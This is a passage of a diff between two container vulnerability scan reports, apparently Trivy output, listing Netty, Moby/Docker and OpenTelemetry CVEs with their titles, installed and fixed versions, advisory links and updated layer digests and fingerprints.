+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mfg7-5gfp-c4w3 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:8557d8c65bab51198e0e90654f6b16cfd52e32a6c9efea87a50063b106d9baa5 
+│     │      ├ Fingerprint     : sha256:591287b5b36dc64478dd09bf04f33bba11c27a7d2e274af2dec0421d71452844 
 │     │      ├ Title           : Netty: Memory Leak in DNS Record Decoder via Malformed Domain Names 
 │     │      ├ Description     : ### Summary
 │     │      │                   A memory leak can be caused in Netty's DNS codec by sending malicious DNS
@@ -511,7 +104,7 @@
 │     │      │                  ╰ [7]: https://github.com/netty/netty/security/advisories/GHSA-mfg7-5gfp-c4w3 
 │     │      ├ PublishedDate   : 2026-07-24T16:52:50Z 
 │     │      ╰ LastModifiedDate: 2026-07-24T16:52:50Z 
-│     ├ [5]  ╭ VulnerabilityID : CVE-2026-55831 
+│     ├ [2]  ╭ VulnerabilityID : CVE-2026-55831 
 │     │      ├ VendorIDs        ─ [0]: GHSA-6jqx-86gh-f27w 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -520,14 +113,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55831 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:c104ac95495b31033556908844bed69dfa839ed1326e165ac974bbaf6be6e35c 
+│     │      ├ Fingerprint     : sha256:7a6706bc3490168ecc3037a0a63ee58924fce6c3a9f3cf330ebd4c8baca4fc73 
 │     │      ├ Title           : io.netty/netty-codec-http: Netty: Denial of Service via SPDY SETTINGS frame
 │     │      │                   processing 
 │     │      ├ Description     : Netty is a network application framework for development of protocol servers
@@ -560,7 +153,7 @@
 │     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55831 
 │     │      ├ PublishedDate   : 2026-07-21T00:17:35.383Z 
 │     │      ╰ LastModifiedDate: 2026-07-23T15:17:16.78Z 
-│     ├ [6]  ╭ VulnerabilityID : CVE-2026-55833 
+│     ├ [3]  ╭ VulnerabilityID : CVE-2026-55833 
 │     │      ├ VendorIDs        ─ [0]: GHSA-mvh2-crg5-v77c 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -569,14 +162,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55833 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:ac0968511d94a4abed16a2596fee5c901dc9e4b8ae1b007333e6ac0c68a863f3 
+│     │      ├ Fingerprint     : sha256:7cbbf6b84bd35bf6a5fa035ebd89cd092b75b0c8174681230c9babdc12e84eb4 
 │     │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service via SPDY header
 │     │      │                   decompression amplification 
 │     │      ├ Description     : Netty is a network application framework for development of protocol servers
@@ -608,7 +201,7 @@
 │     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55833 
 │     │      ├ PublishedDate   : 2026-07-21T00:17:35.537Z 
 │     │      ╰ LastModifiedDate: 2026-07-23T13:34:45.383Z 
-│     ├ [7]  ╭ VulnerabilityID : CVE-2026-56745 
+│     ├ [4]  ╭ VulnerabilityID : CVE-2026-56745 
 │     │      ├ VendorIDs        ─ [0]: GHSA-jppx-w49h-x2qq 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -617,14 +210,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56745 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:3cf137d7edc53d3f8bfb07e0f89ace85f596ed10712c33d6f86586a600758bba 
+│     │      ├ Fingerprint     : sha256:67e016edfc760b90711090089c1bac03bc5b407f4f16ec96efaea20968b8154c 
 │     │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service via memory
 │     │      │                   exhaustion in SPDY-to-HTTP codec 
 │     │      ├ Description     : Netty is a network application framework for development of protocol servers
@@ -662,7 +255,7 @@
 │     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-56745 
 │     │      ├ PublishedDate   : 2026-07-21T22:17:14.5Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T14:46:55.073Z 
-│     ├ [8]  ╭ VulnerabilityID : CVE-2026-56746 
+│     ├ [5]  ╭ VulnerabilityID : CVE-2026-56746 
 │     │      ├ VendorIDs        ─ [0]: GHSA-6cqp-g7gg-8hr5 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -671,14 +264,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56746 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:bcf9f4837802b490917a62b80060d851d1ce14da0806d8a426bf07d2bed6f0ca 
+│     │      ├ Fingerprint     : sha256:2d8ec70050bb3c4e145a472c9a5d53d403e46cdc1fed9748990ae108c4eeba38 
 │     │      ├ Title           : io.netty/netty-codec-http: Netty: Security control bypass allows unauthorized
 │     │      │                   requests via null origin header 
 │     │      ├ Description     : Netty is a network application framework for development of protocol servers
@@ -709,7 +302,7 @@
 │     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-56746 
 │     │      ├ PublishedDate   : 2026-07-21T22:17:14.667Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T14:47:53.123Z 
-│     ├ [9]  ╭ VulnerabilityID : CVE-2026-59898 
+│     ├ [6]  ╭ VulnerabilityID : CVE-2026-59898 
 │     │      ├ VendorIDs        ─ [0]: GHSA-4mp9-239f-g9hg 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -718,14 +311,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59898 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:2166ad87af5904d4514208846237509a5ed8c9883c1e294569d9471e770b9d6a 
+│     │      ├ Fingerprint     : sha256:d31bd51d9fcb6d890c95bd59cdbab6249ff6d4fd1d85b2b0798f41fc3223326d 
 │     │      ├ Title           : io.netty/netty-codec-http: Netty: Protocol version confusion in
 │     │      │                   netty-codec-http (WebSocket) 
 │     │      ├ Description     : Netty is an asynchronous, event-driven network application framework.  Prior
@@ -753,7 +346,7 @@
 │     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59898 
 │     │      ├ PublishedDate   : 2026-07-29T19:16:48.74Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T16:33:59.58Z 
-│     ├ [10] ╭ VulnerabilityID : CVE-2026-59899 
+│     ├ [7]  ╭ VulnerabilityID : CVE-2026-59899 
 │     │      ├ VendorIDs        ─ [0]: GHSA-q4f6-jm68-57ww 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -762,14 +355,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59899 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:e8d5761d1af1ec4486e3e49f2c36331af5da584b5c948e0f4e8c0bfe0cb7530f 
+│     │      ├ Fingerprint     : sha256:88bf41646ec0b56bf1d2d65e8a09d471db6211c03c2cf5aa732dd62f18e6ebfd 
 │     │      ├ Title           : io.netty/netty-codec-http: Netty: Memory exhaustion in netty-codec-http
 │     │      │                   (decompression bomb) 
 │     │      ├ Description     : Netty is an asynchronous, event-driven network application framework. Prior to
@@ -802,7 +395,7 @@
 │     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-59899 
 │     │      ├ PublishedDate   : 2026-07-29T18:16:56.137Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T16:33:59.58Z 
-│     ├ [11] ╭ VulnerabilityID : CVE-2026-59921 
+│     ├ [8]  ╭ VulnerabilityID : CVE-2026-59921 
 │     │      ├ VendorIDs        ─ [0]: GHSA-gcjf-9mgh-3p7g 
 │     │      ├ PkgName         : io.netty:netty-codec-http 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
@@ -811,14 +404,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59921 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:ea922e122b989b63d0499c3075b9c096131bad4278ea07d6bb5f84a725db1801 
+│     │      ├ Fingerprint     : sha256:41e84909be20120959eb5aa040e33667cf896389545acc0503e6656f24c8c006 
 │     │      ├ Title           : io.netty/netty-codec-http: Netty: CRLF Injection via Multipart Filename in
 │     │      │                   Netty HttpPostRequestEncoder 
 │     │      ├ Description     : Netty is an asynchronous, event-driven network application framework. Prior to
@@ -849,7 +442,7 @@
 │     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59921 
 │     │      ├ PublishedDate   : 2026-07-28T23:17:09.923Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T16:33:59.58Z 
-│     ├ [12] ╭ VulnerabilityID : CVE-2026-56819 
+│     ├ [9]  ╭ VulnerabilityID : CVE-2026-56819 
 │     │      ├ VendorIDs        ─ [0]: GHSA-93wv-jw9v-4972 
 │     │      ├ PkgName         : io.netty:netty-codec-http2 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.15.Final.jar 
@@ -858,14 +451,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56819 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:36c305114c7d275d124ceb230b1e9717c4bb9c3ffd8222820f9b2e63b3966ee6 
+│     │      ├ Fingerprint     : sha256:50a43f74ffdeec63a0d09c7cf5eae165fd6b7246d48baf2feab6838604f6bc36 
 │     │      ├ Title           : io.netty/netty-codec-http2: Netty: Denial of Service via HTTP/2 DATA frame
 │     │      │                   memory leak 
 │     │      ├ Description     : Netty is a network application framework for development of protocol servers
@@ -902,7 +495,7 @@
 │     │      │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2026-56819 
 │     │      ├ PublishedDate   : 2026-07-21T23:17:52.263Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T14:46:35.563Z 
-│     ╰ [13] ╭ VulnerabilityID : CVE-2026-59900 
+│     ╰ [10] ╭ VulnerabilityID : CVE-2026-59900 
 │            ├ VendorIDs        ─ [0]: GHSA-c69g-56f8-xwqj 
 │            ├ PkgName         : io.netty:netty-codec-http2 
 │            ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.15.Final.jar 
@@ -911,14 +504,14 @@
 │            ├ InstalledVersion: 4.2.15.Final 
 │            ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │            ├ Status          : fixed 
-│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│            ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│            │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │            ├ SeveritySource  : ghsa 
 │            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59900 
 │            ├ DataSource       ╭ ID  : ghsa 
 │            │                  ├ Name: GitHub Security Advisory Maven 
 │            │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│            ├ Fingerprint     : sha256:5170d84583673134ac6125ea99f961810bcee3e230c7654c997c4126f1fb5593 
+│            ├ Fingerprint     : sha256:508edede47706146f447350a8368008b6f2177ad4414d8eb2058e859a1fcc695 
 │            ├ Title           : io.netty/netty-codec-http2: Netty: Improper header neutralization in
 │            │                   netty-codec-http2 
 │            ├ Description     : Netty is an asynchronous, event-driven network application framework. Prior to
@@ -958,14 +551,14 @@
 │     │      ├ InstalledVersion: v28.5.2+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:60b9cf8b889157791a28bd5bee51fa175d9893a159e301e48d8b1925fac98797 
+│     │      ├ Fingerprint     : sha256:a3a3a16c1fedb545181fec9ced6addc3204d434988adb919a8f31a81d739ef5a 
 │     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
 │     │      │                   security vulnerability has been detected that allows attackers to bypass
@@ -1004,14 +597,14 @@
 │     │      │                  ╰ UID : 574b64b426d7eeee 
 │     │      ├ InstalledVersion: v28.5.2+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:68bcf22f3de7624116d9a1c93ee08462d7150297fde5745bf75ee64c169b55a6 
+│     │      ├ Fingerprint     : sha256:631ea9f53c6eb621d80c60859f90157ac268d488ab0ee619cfc8afdc46837a17 
 │     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
 │     │      │                   image and compressed archive upload 
 │     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
@@ -1060,14 +653,14 @@
 │     │      │                  ╰ UID : 574b64b426d7eeee 
 │     │      ├ InstalledVersion: v28.5.2+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:108fb33c306b113cedf918f47eef352c22eb7151194b9f190c6376a65c6e3948 
+│     │      ├ Fingerprint     : sha256:3301aeefe6c43525caecd4510d808853f44d2dfcc3f916a10e783979ef5bff7b 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby container framework: Host
 │     │      │                    file overwrite via race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -1107,14 +700,14 @@
 │     │      ├ InstalledVersion: v28.5.2+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:0948760b36f0029ee5773d7af1ab860b7a0dd4e4ffcaa06cab1a74db9e8a5998 
+│     │      ├ Fingerprint     : sha256:62fd0244333b78950db9a4c3d99547557d55394731eee8deb5a016a9a7379fd7 
 │     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
 │     │      │                   plugin installation 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
@@ -1163,14 +756,14 @@
 │     │      │                  ╰ UID : 574b64b426d7eeee 
 │     │      ├ InstalledVersion: v28.5.2+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:fdb379d37fa29f3f63b1a105c6f20e047854db24d6a9ff27769f7e2c4c9364e4 
+│     │      ├ Fingerprint     : sha256:4b9f253ea2a6c1dc96a8c3ae6c24868ba21d498c353ebe7996107017860fda4e 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
 │     │      │                   race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -1204,14 +797,14 @@
 │     │      ├ InstalledVersion: v1.42.0 
 │     │      ├ FixedVersion    : 1.43.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39883 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:24d5d8e5a3ef8ef5bc92214a12aef252a2b310cc26e55acef9d48810060fb283 
+│     │      ├ Fingerprint     : sha256:11163844db55665011a930c0ef7106917fd4d676367c55b4472a2ff5bd087a5e 
 │     │      ├ Title           : github.com/open-telemetry/opentelemetry-go: OpenTelemetry-Go: Arbitrary code
 │     │      │                   execution via PATH hijacking on BSD/Solaris 
 │     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.15.0 to
@@ -1256,13 +849,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
